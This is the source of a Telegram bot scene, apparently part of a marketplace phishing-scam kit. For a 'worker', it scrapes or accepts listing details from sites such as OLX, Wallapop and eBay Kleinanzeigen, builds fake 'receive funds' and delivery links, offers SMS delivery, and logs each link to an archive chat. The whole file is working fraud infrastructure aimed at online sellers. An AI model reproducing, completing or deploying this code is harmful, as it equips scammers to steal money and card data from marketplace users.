const { Scenes } = require('telegraf')
const validURL = require('valid-url')
const axios = require('axios')

const account = require('../../database/models/account')
const receive = require('../../database/models/receive')
const linkGen = require('../other/generateLink')
const config = require('../../configs/config.json')
const logs = require('../../database/models/log')

const ebayParser = require('../../src/other/parseEbay')

const creatorScene = new Scenes.WizardScene('creatorScene', async (ctx) => {
    try {
        ctx.wizard.state.data = {}
        ctx.wizard.state.data.tgid = ctx.from.id
        ctx.wizard.state.data.service = ctx.callbackQuery.data
        
        await ctx.replyWithHTML(`🤖 <b>Выберите тип создания ссылки</b>`, {
            reply_markup: {
                resize_keyboard: true,
                keyboard: [
                    [{ text: '🥷🏻 Ручной' }, { text: '⚙️ Парсер' }],
                    [{ text: 'Назад' }]
                ]
            }
        })

        return ctx.wizard.next()
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        if (ctx.message.text == '🥷🏻 Ручной') {
            ctx.wizard.state.data.type = ctx.message.text
            ctx.replyWithHTML(`<b>🤖 Пришли название товара</b>`, {
                reply_markup: {
                    resize_keyboard: true,
                    keyboard: [
                        [{ text: 'Назад' }]
                    ]
                }
            })

            return ctx.wizard.next()
        } else if (ctx.message.text == '⚙️ Парсер') {
            ctx.wizard.state.data.type = ctx.message.text
            ctx.replyWithHTML(`<b>🤖 Введите ссылку на товар</b>`, {
                reply_markup: {
                    resize_keyboard: true,
                    keyboard: [
                        [{ text: 'Назад' }]
                    ]
                }
            })

            return ctx.wizard.selectStep(4)
        } else {
            await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                    ]
                }
            })
    
            return ctx.scene.leave()
        }
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        if (ctx.message.text == 'Назад') {
            await ctx.replyWithHTML(`Вернитесь в меню.`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                    ]
                }
            })
    
            return ctx.scene.leave()
        } else {
            ctx.wizard.state.data.name = ctx.message.text
            await ctx.replyWithHTML(`🤖 <b>Пришли прайс товара</b>`)
        
            return ctx.wizard.next()
        }
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        if (ctx.message.text == 'Назад') {
            await ctx.replyWithHTML(`Вернитесь в меню.`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                    ]
                }
            })
    
            return ctx.scene.leave()
        } else {
            ctx.wizard.state.data.price = parseInt(ctx.message.text)
            await ctx.replyWithHTML(`🤖 <b>Пришли ссылку на изображение товара</b> (@Images_24_bot)`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Пропустить ⏭', callback_data: 'skip' }]
                    ]
                }
            })
            
            return ctx.wizard.next()
        }
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        if (ctx.message.text == 'Назад') {
            await ctx.replyWithHTML(`Вернитесь в меню.`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                    ]
                }
            })
    
            return ctx.scene.leave()
        } else {
            if (ctx.wizard.state.data.type == "🥷🏻 Ручной")  {
                ctx.wizard.state.data.photo = ctx.message.text
            } else {
                /* await ctx.replyWithHTML(`Внимание! Вы пробуете сделать ссылку через парсер. Сейчас парсер находится на ре кодинге, пожалуйста, подождите часик и парсер снова будет работать, а пока что вернитесь в меню и используйте ручное создание. Спасибо.`, {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                        ]
                    }
                })
        
                return ctx.scene.leave() */
                if (validURL.isUri(ctx.message.text)) {
                    let hostname = new URL(ctx.message.text).hostname
                    if ((hostname.includes('olx.pt')) || (hostname.includes('olx.ro')) || (hostname.includes('olx.pl')) || (hostname.includes('quoka.de')) || (hostname.includes('wallapop.com')) || (hostname.includes('ebay-kleinanzeigen')) /* || (hostname.includes('bazos')) || (hostname.includes('bazar')) */) {
                        await ctx.replyWithHTML('🤖 <b>Парсим... Подожодите 2-5 секунд, пожалуйста!</b>')
                        if (ctx.wizard.state.data.service != '🇩🇪 Ebay 2.0') {
                            await axios.post('http://51.91.57.147:3000/parse', {
                                service: `${ctx.wizard.state.data.service}`,
                                url: `${ctx.message.text}`,
                                timeout: 5000
                            }).then(async (res) => {
                                if (res.data.error) {
                                    await ctx.reply(`Проблема при парсинге... Вернитсь в главное меню и нажмите на "Сообщить об ошибке" и действуйте по инструкции.`, {
                                        reply_markup: {
                                            inline_keyboard: [
                                                [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                                            ]
                                        }
                                    })
        
                                    return ctx.scene.leave()
                                } else {
                                    ctx.wizard.state.data.name = await res.data['name']
                                    ctx.wizard.state.data.price = await res.data['price']
                                    ctx.wizard.state.data.photo = await res.data['image']
                                }
                            }).catch(async (err) => {
                                await ctx.reply(`Проблема при парсинге... Вернитсь в главное меню и нажмите на "Сообщить об ошибке" и действуйте по инструкции.`, {
                                    reply_markup: {
                                        inline_keyboard: [
                                            [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                                        ]
                                    }
                                })
    
                                return ctx.scene.leave()
                            })
                        } else {
                            await ebayParser(ctx.message.text, '🇩🇪 Ebay 2.0').then(async (res) => {
                                ctx.wizard.state.data.name = await res[0]
                                ctx.wizard.state.data.price = await res[1]
                                ctx.wizard.state.data.photo = await res[2]
                            }).catch(async (err) => {
                                await ctx.reply(`Проблема при парсинге... Вернитсь в главное меню и нажмите на "Сообщить об ошибке" и действуйте по инструкции.`, {
                                    reply_markup: {
                                        inline_keyboard: [
                                            [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                                        ]
                                    }
                                })
    
                                return ctx.scene.leave()
                            })
                        }
                    } else {
                        await ctx.replyWithHTML(`Ошибка! Возможно, что сервис, который вы пытаетесь спарсить - недоступен или же парсер для него ещё дописывается. Вернитесь в меню.`, {
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                                ]
                            }
                        })
                
                        return ctx.scene.leave()
                    }
                } else {
                    await ctx.replyWithHTML(`🖐🏻 Вы выбрали парсер, но ввели не ссылку. Выберите парсер снова и попробуйте ещё раз.`)
                    return ctx.wizard.selectStep(1)
                }
            }
            
            await account.findOne({ tgID: ctx.from.id }).then(async (res) => {
                if (res.address == '') {
                    await ctx.replyWithHTML(`🤖 <b>Введи адрес доставки</b>`)
                } else {
                    await ctx.replyWithHTML(`🤖 <b>Введи адрес доставки</b>`, {
                        reply_markup: {
                            resize_keyboard: true,
                            keyboard: [
                                [{ text: res.address }],
                                [{ text: 'Назад' }]
                            ]
                        }
                    })
                }
            })
        
            return ctx.wizard.next()
        }
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        console.log(e)

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        if (ctx.message.text == 'Назад') {
            await ctx.replyWithHTML(`Вернитесь в меню.`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                    ]
                }
            })
    
            return ctx.scene.leave()
        } else {
            ctx.wizard.state.data.address = ctx.message.text
            await account.findOneAndUpdate({ tgID: ctx.from.id }, { $set: { address: ctx.message.text } }, { new: true })
            await account.findOne({ tgID: ctx.from.id }).then(async (res) => {
                if (res.name == '') {
                    await ctx.replyWithHTML(`🤖 <b>Введи фамилию и имя получателя (Пример:</b> <code>Иванов Иван</code><b>)</b>`)
                } else {
                    await ctx.replyWithHTML(`🤖 <b>Введи фамилию и имя получателя (Пример:</b> <code>Иванов Иван</code><b>)</b>`, {
                        reply_markup: {
                            resize_keyboard: true,
                            keyboard: [
                                [{ text: res.name }],
                                [{ text: 'Назад' }]
                            ]
                        }
                    })
                }
            })
            
            return ctx.wizard.next()
        }
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        ctx.wizard.state.data.fio = ctx.message.text
        await account.findOneAndUpdate({ tgID: ctx.from.id }, { $set: { name: ctx.message.text } }, { new: true })

        await receive.insertMany({
            service: ctx.wizard.state.data.service,
            tgID: ctx.wizard.state.data.tgid,
            tgUsername: ctx.from.username,
            product_name: ctx.wizard.state.data.name,
            product_price: ctx.wizard.state.data.price,
            product_image: ctx.wizard.state.data.photo,
            product_address: ctx.wizard.state.data.address,
            product_buyer: ctx.wizard.state.data.fio
        }).then(async (res) => {
            await linkGen(res[0].service, res[0].link, ctx.from.id).then(async (link) => {
                let inline_arr = []

                inline_arr.push(new Array({ text: '🕸 Получение средств 🕸', url: link }))
                inline_arr.push(new Array({ text: '💌 Желаете отправить СМС? 💌', callback_data: `sendSMS ${res[0].link}` }))
                
                /* if (ctx.wizard.state.data.service.includes('Vinted')) {
                    inline_arr.push(new Array({ text: '📧 Желаете отправить eMail? 📧', callback_data: `sendEmail ${res[0].link}` }))
                } */

                if (ctx.wizard.state.data.service.includes('Ebay 2.0')) {
                    inline_arr.push(new Array({ text: '❔ Как работает доставка ❔', url: `${link.replace('order', 'delivery')}` }))
                }

                inline_arr.push(new Array({ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }))

                await ctx.replyWithHTML(`✅ <b>Готово! Удачной работы ;)</b>\n\n🔗 <b>Получение средств:</b> ${link}`, {
                    reply_markup: {
                        inline_keyboard: inline_arr,
                        remove_keyboard: true
                    }
                })

                await ctx.telegram.sendMessage(config.bot.archive_chat, `${res[0].service} <b>создание!</b>\n\n<b>Воркер:</b> ${res[0].tgID} <b>|</b> @${res[0].tgUsername}\n<b>Название:</b> ${res[0].product_name}\n<b>Прайс:</b> ${res[0].product_price}\n\n<b>Ссылка:</b> ${link}`, { 
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'Удалить', callback_data: `deleteSpam ${res[0].link}` }]
                        ]
                    }
                }).catch(async (e) => {
                    console.log(e)
                })
            })

            await logs.insertMany({ link: res[0].link })
        })

        return ctx.scene.leave()
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назаддддд' }]
                ]
            }
        })

        console.log(e)

        return ctx.scene.leave()
    }
})

creatorScene.action('skip', async (ctx) => {
    ctx.wizard.state.data.photo = 'https://m.media-amazon.com/images/I/51UW1849rJL._AC_SY450_.jpg'
    await account.findOne({ tgID: ctx.from.id }).then(async (res) => {
        if (res.address == '') {
            await ctx.replyWithHTML(`🤖 <b>Введи адрес доставки</b>`)
        } else {
            await ctx.replyWithHTML(`🤖 <b>Введи адрес доставки</b>`, {
                reply_markup: {
                    resize_keyboard: true,
                    keyboard: [
                        [{ text: res.address }],
                        [{ text: 'Назад' }]
                    ]
                }
            })
        }
    })

    return await ctx.wizard.next()
})

module.exports = creatorScene